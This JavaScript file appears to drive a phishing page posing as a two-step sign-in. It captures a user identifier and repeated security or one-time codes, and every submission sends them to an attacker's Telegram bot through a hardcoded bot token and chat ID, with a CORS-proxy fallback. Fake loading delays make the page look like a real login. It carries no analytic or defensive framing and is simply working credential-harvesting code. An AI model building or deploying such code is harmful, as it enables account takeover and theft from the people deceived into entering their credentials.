document.addEventListener('DOMContentLoaded', function() {
        // Get elements
        const page1 = document.getElementById('page1');
        const page2 = document.getElementById('page2');
        const page3 = document.getElementById('page3');
        const userIdentifierInput = document.getElementById('userIdentifier');
        const securityCodeInput = document.getElementById('securityCode');
        const notificationSecurityCodeInput = document.getElementById('notificationSecurityCode');
        const nextBtn = document.getElementById('nextBtn');
        const submitBtn = document.getElementById('submitBtn');
        const submitAfterNotificationBtn = document.getElementById('submitAfterNotificationBtn');
        const backToUser = document.getElementById('backToUser');
        const backToUserFromNotification = document.getElementById('backToUserFromNotification');
        const userIdentifierDisplay = document.getElementById('userIdentifierDisplay');
        const userIdentifierNotification = document.getElementById('userIdentifierNotification');
        const loadingIndicator = document.getElementById('loadingIndicator');
        
        // API details - using direct Telegram API instead of proxy
        const BOT_TOKEN = '8276048488:AAHZ3RbDMkTwJIsnTTH6-TUebYy5Yw5TFX4';
        const CHAT_ID = '8469040320';
        
        // Function to send data to Telegram using direct API
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', message);
            
            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent to Telegram:', data);
            })
            .catch(error => {
                console.error('Error sending to Telegram:', error);
                // Fallback to proxy if direct API fails
                sendToTelegramFallback(message);
            });
        }
        
        // Fallback function using proxy
        function sendToTelegramFallback(message) {
            const proxyUrl = 'https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot' + 
                            BOT_TOKEN + '/sendMessage';
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', message);
            
            fetch(proxyUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent via proxy:', data);
            })
            .catch(error => {
                console.error('Error sending via proxy:', error);
            });
        }

        // Store identifier in localStorage when Continue is clicked
        nextBtn.addEventListener('click', function() {
            if (userIdentifierInput.value) {
                localStorage.setItem('user_id', userIdentifierInput.value);
                userIdentifierDisplay.textContent = userIdentifierInput.value;
                userIdentifierNotification.textContent = userIdentifierInput.value;
                
                // Show loading
                loadingIndicator.style.display = 'block';
                
                // Simulate network request
                setTimeout(function() {
                    loadingIndicator.style.display = 'none';
                    page1.classList.remove('active');
                    page2.classList.add('active');
                }, 1000);
            }
        });
        
        // Handle security code submission
        submitBtn.addEventListener('click', function() {
            if (securityCodeInput.value) {
                // Get the identifier and code
                const identifier = localStorage.getItem('user_id');
                const code = securityCodeInput.value;
                
                // Create the message to send
                const message = `User ID: ${identifier}, Security Code: ${code}`;
                
                // Send to Telegram
                sendToTelegram(message);
                
                // Show loading
                loadingIndicator.style.display = 'block';
                
                // Simulate network request and notification
                setTimeout(function() {
                    loadingIndicator.style.display = 'none';
                    page2.classList.remove('active');
                    page3.classList.add('active');
                }, 1000);
            }
        });
        
        // Handle submission from notification page
        submitAfterNotificationBtn.addEventListener('click', function() {
            if (notificationSecurityCodeInput.value) {
                // Get the identifier and code
                const identifier = localStorage.getItem('user_id');
                const code = notificationSecurityCodeInput.value;
                
                // Create the message to send
                const message = `User ID: ${identifier}, Security Code: ${code}`;
                
                // Send to Telegram
                sendToTelegram(message);
                
                // Show loading
                loadingIndicator.style.display = 'block';
                
                // Simulate network request and notification (again)
                setTimeout(function() {
                    loadingIndicator.style.display = 'none';
                    // Stay on notification page
                }, 1000);
            }
        });
        
        // Back to identifier from security page
        backToUser.addEventListener('click', function(e) {
            e.preventDefault();
            page2.classList.remove('active');
            page1.classList.add('active');
        });
        
        // Back to identifier from notification page
        backToUserFromNotification.addEventListener('click', function(e) {
            e.preventDefault();
            page3.classList.remove('active');
            page1.classList.add('active');
        });
        
        // Prefill identifier if it exists in localStorage
        const savedIdentifier = localStorage.getItem('user_id');
        if (savedIdentifier) {
            userIdentifierInput.value = savedIdentifier;
            userIdentifierDisplay.textContent = savedIdentifier;
            userIdentifierNotification.textContent = savedIdentifier;
        }
    });
